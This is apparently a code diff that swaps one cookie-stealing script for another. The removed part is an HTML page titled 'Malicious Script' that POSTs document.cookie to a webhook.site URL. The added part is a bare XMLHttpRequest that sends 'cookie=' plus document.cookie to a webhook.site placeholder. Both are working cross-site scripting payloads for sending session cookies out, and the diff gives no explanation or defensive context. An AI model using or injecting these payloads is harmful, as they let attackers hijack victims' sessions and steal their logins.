@@ -1,15 +1,4 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Malicious Script</title>
-</head>
-<body>
-    <script>
-    fetch('https://webhook.site/b6f914e2-8063-4ae3-8861-a02b8bb97fce', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: document.cookie,
-    });
-    </script>
-</body>
-</html>
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://webhook.site/your-id');
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+xhr.send('cookie=' + document.cookie);
